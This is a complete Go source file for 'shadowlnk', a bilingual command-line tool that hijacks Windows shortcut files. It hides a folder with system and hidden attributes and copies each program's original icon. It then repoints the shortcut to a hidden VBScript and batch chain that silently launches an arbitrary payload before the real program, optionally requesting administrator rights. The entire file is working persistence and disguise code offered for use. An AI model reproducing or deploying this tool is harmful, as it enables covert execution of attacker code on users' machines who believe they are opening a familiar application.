package main

import (
	"flag"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	ico "github.com/Kodeworks/golang-image-ico"
	"github.com/fcjr/geticon"
)

func ShowUsage() {
	fmt.Println(`用法 / Usage:
  shadowlnk -i <目标LNK路径> -w <可写目录> -p <PE载荷路径> [-x <载荷启动参数>] [-power]
  shadowlnk -r <目录> -w <可写目录> -p <PE载荷路径> [-x <载荷启动参数>] [-power]

Usage:
  shadowlnk -i <Target LNK Path> -w <Writable Directory> -p <PE Payload Path> [-x <Payload Args>] [-power]
  shadowlnk -r <Directory> -w <Writable Directory> -p <PE Payload Path> [-x <Payload Args>] [-power]

参数说明 / Parameters:
  -i      指定单个要劫持的快捷方式文件路径（与 -r 互斥）  
          Specify a single shortcut file to hijack (mutually exclusive with -r)

  -r      指定目录，自动劫持此目录所有快捷方式文件（不递归）  
          Specify directory to hijack all shortcut files in it (non-recursive)

  -w      可写目录（用于存放生成的隐藏目录和辅助文件）  
          Writable directory for storing generated hidden folders and helper files

  -p      需要执行的载荷路径  
          Path of the payload to execute

  -x      载荷启动参数，例如 -x "-wacky"（可选）  
          Optional payload start parameters, e.g., -x "-wacky"

  -power  劫持快捷方式将启动管理员认证启动（可选）  
          Hijacked shortcuts launch with admin prompt (optional)

  -h      显示帮助  
          Show this help message

Version: 1.0
Author: wackymaker
`)
}

func createHiddenSystemDir(baseDir, name string) (string, error) {
	systemDir := filepath.Join(baseDir, name)
	original := systemDir
	count := 1
	for {
		if _, err := os.Stat(systemDir); os.IsNotExist(err) {
			break
		}
		systemDir = fmt.Sprintf("%s%d", original, count)
		count++
	}
	err := os.MkdirAll(systemDir, 0700)
	if err != nil {
		return "", fmt.Errorf("创建目录失败 / Failed to create directory: %w", err)
	}
	cmd := exec.Command("attrib", "+s", "+h", systemDir)
	if err := cmd.Run(); err != nil {
		return "", fmt.Errorf("设置隐藏属性失败 / Failed to set hidden attribute: %w", err)
	}
	return systemDir, nil
}

func copyFile(src, dst string) error {
	srcFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer srcFile.Close()
	dstFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer dstFile.Close()
	_, err = io.Copy(dstFile, srcFile)
	return err
}

func getLnkInfo(lnkPath string) (string, string, error) {
	script := fmt.Sprintf(`
$shl = New-Object -COMObject WScript.Shell
$shortcut = $shl.CreateShortcut("%s")
Write-Output $shortcut.TargetPath
Write-Output $shortcut.IconLocation
`, lnkPath)
	cmd := exec.Command("powershell", "-NoProfile", "-Command", script)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", "", err
	}
	lines := strings.Split(strings.TrimSpace(string(output)), "\n")
	if len(lines) < 2 {
		return "", "", fmt.Errorf("无法解析快捷方式信息 / Failed to parse shortcut info")
	}
	target := strings.TrimSpace(lines[0])
	iconLocation := strings.TrimSpace(lines[1])
	return target, iconLocation, nil
}

func createScripts(systemDir, payloadPath, payloadArgs, originalTarget, baseName string, power bool) (string, string, error) {
	batPath := filepath.Join(systemDir, baseName+".bat")
	vbsPath := filepath.Join(systemDir, baseName+".vbs")
	var batContent string
	if strings.TrimSpace(payloadArgs) != "" {
		batContent = fmt.Sprintf(`start "" "%s" %s
timeout /t 1 >nul
start "" "%s"
`, payloadPath, payloadArgs, originalTarget)
	} else {
		batContent = fmt.Sprintf(`start "" "%s"
timeout /t 1 >nul
start "" "%s"
`, payloadPath, originalTarget)
	}
	var vbsContent string
	if power {
		vbsContent = fmt.Sprintf(`Set shell = CreateObject("Shell.Application")
shell.ShellExecute "%s", "", "", "runas", 0
`, batPath)
	} else {
		vbsContent = fmt.Sprintf(`Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "%s" & chr(34), 0
Set WshShell = Nothing
`, batPath)
	}
	if err := os.WriteFile(batPath, []byte(batContent), 0644); err != nil {
		return "", "", err
	}
	if err := os.WriteFile(vbsPath, []byte(vbsContent), 0644); err != nil {
		return "", "", err
	}
	return batPath, vbsPath, nil
}

func modifyLnk(lnkPath, newTarget, iconPath string) error {
	script := fmt.Sprintf(`
$shl = New-Object -COMObject WScript.Shell
$shortcut = $shl.CreateShortcut("%s")
$shortcut.TargetPath = "%s"
$shortcut.IconLocation = "%s"
$shortcut.Save()
`, lnkPath, newTarget, iconPath)
	cmd := exec.Command("powershell", "-NoProfile", "-Command", script)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("修改快捷方式失败 / Failed to modify shortcut: %v, output: %s", err, string(output))
	}
	return nil
}

func processLnk(lnkPath, baseHiddenDir, payloadPath, payloadArgs string, power bool) error {
	originalTarget, _, err := getLnkInfo(lnkPath)
	if err != nil {
		return fmt.Errorf("获取快捷方式信息失败 / Failed to get shortcut info: %v", err)
	}
	originalTarget = strings.TrimSpace(originalTarget)
	if originalTarget == "" {
		return fmt.Errorf("快捷方式无效 / Invalid shortcut: %s", lnkPath)
	}
	fmt.Printf("处理快捷方式 / Processing shortcut: %s\n原目标 / Original target: %s\n", lnkPath, originalTarget)
	baseName := strings.TrimSuffix(filepath.Base(originalTarget), filepath.Ext(originalTarget))
	systemDir, err := createHiddenSystemDir(baseHiddenDir, baseName)
	if err != nil {
		return fmt.Errorf("隐藏目录创建失败 / Failed to create hidden directory: %v", err)
	}
	img, err := geticon.FromPath(originalTarget)
	if err != nil {
		return fmt.Errorf("提取图标失败 / Failed to extract icon: %v", err)
	}
	icoPath := filepath.Join(systemDir, "icon.ico")
	f, err := os.Create(icoPath)
	if err != nil {
		return fmt.Errorf("创建ico文件失败 / Failed to create ico file: %v", err)
	}
	defer f.Close()
	if err := ico.Encode(f, img); err != nil {
		return fmt.Errorf("编码ico失败 / Failed to encode ico: %v", err)
	}
	_, vbsPath, err := createScripts(systemDir, payloadPath, payloadArgs, originalTarget, baseName, power)
	if err != nil {
		return fmt.Errorf("创建辅助脚本失败 / Failed to create helper scripts: %v", err)
	}
	hijackLnkPath := filepath.Join(systemDir, filepath.Base(lnkPath))
	if err := copyFile(lnkPath, hijackLnkPath); err != nil {
		return fmt.Errorf("复制快捷方式失败 / Failed to copy shortcut: %v", err)
	}
	if err := modifyLnk(hijackLnkPath, vbsPath, icoPath); err != nil {
		return fmt.Errorf("修改劫持快捷方式失败 / Failed to modify hijacked shortcut: %v", err)
	}
	if err := os.Remove(lnkPath); err != nil {
		fmt.Printf("删除原快捷方式失败（非致命） / Failed to remove original shortcut (non-fatal): %v\n", err)
	}
	if err := copyFile(hijackLnkPath, lnkPath); err != nil {
		return fmt.Errorf("替换快捷方式失败 / Failed to replace shortcut: %v", err)
	}
	fmt.Printf("劫持成功 / Hijack successful: %s\n", lnkPath)
	return nil
}

func main() {
	iFlag := flag.String("i", "", "指定单个要劫持的快捷方式文件路径 / Specify single shortcut file to hijack")
	rFlag := flag.String("r", "", "指定目录，只处理该目录下的快捷方式文件（不递归子目录） / Specify directory, only process shortcuts in this directory (non-recursive)")
	wFlag := flag.String("w", "", "可写目录，用于存放生成的隐藏目录和辅助文件 / Writable directory for storing hidden folders and helper files")
	pFlag := flag.String("p", "", "需要执行的载荷路径 / Path of the payload to execute")
	xFlag := flag.String("x", "", "载荷启动参数（可选） / Optional payload startup parameters")
	powerFlag := flag.Bool("power", false, "以管理员权限启动辅助脚本（可选） / Launch helper script with admin privileges (optional)")
	helpFlag := flag.Bool("h", false, "显示帮助 / Show help")

	flag.Parse()

	if *helpFlag || ((*iFlag == "" && *rFlag == "") || *wFlag == "" || *pFlag == "" || (*iFlag != "" && *rFlag != "")) {
		ShowUsage()
		return
	}

	if *iFlag != "" {
		if err := processLnk(*iFlag, *wFlag, *pFlag, *xFlag, *powerFlag); err != nil {
			fmt.Println("错误 / Error:", err)
			return
		}
	} else {
		entries, err := os.ReadDir(*rFlag)
		if err != nil {
			fmt.Println("读取目录失败 / Failed to read directory:", err)
			return
		}
		for _, entry := range entries {
			if entry.IsDir() {
				continue
			}
			if strings.HasSuffix(strings.ToLower(entry.Name()), ".lnk") {
				lnkPath := filepath.Join(*rFlag, entry.Name())
				if err := processLnk(lnkPath, *wFlag, *pFlag, *xFlag, *powerFlag); err != nil {
					fmt.Println("错误 / Error:", err)
				}
				time.Sleep(500 * time.Millisecond)
			}
		}
	}
}
